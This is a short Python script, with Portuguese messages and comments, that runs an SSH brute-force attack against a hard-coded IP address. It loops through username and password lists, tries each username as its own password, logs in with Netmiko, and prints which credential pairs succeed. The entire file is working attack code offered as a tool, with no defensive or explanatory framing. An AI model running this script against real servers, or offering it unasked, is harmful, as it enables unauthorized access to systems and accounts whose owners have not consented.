#!/usr/bin/python
import sys;

from netmiko import Netmiko

ip = "11.11.11.171";
print("\033[1;33m[*] - SSH Bruteforce Attack", " \033[0;0m");
print("\033[1;33m[*] - SSH target", ip, " \033[0;0m");

with open("user.txt") as users:
    users = users.readlines();
    for user in users:
        passwords_testados = [];
        with open("password.txt") as passwords:
            passwords = passwords.readlines();
            passwords.insert(0, user); # a senha mais usada e o proprio usuario
            for password in passwords:                
                try:
                    if password in passwords_testados:
                        continue;
                    sshconn = Netmiko(ip, username= user.strip(), password=password.strip(), device_type="linux");
                    sshconn.disconnect();
                    print("\033[1;32m[+] SUCES PARA", user.strip(), password.strip(), " \033[0;0m");
                except KeyboardInterrupt:
                    print( 'Usuarqio quer sair.');
                    sys.exit(0);
                except:
                    print("\033[1;31m[-] FALHA PARA", user.strip(), password.strip(), " \033[0;0m");
                finally:
                    passwords_testados.insert(0, password);
    
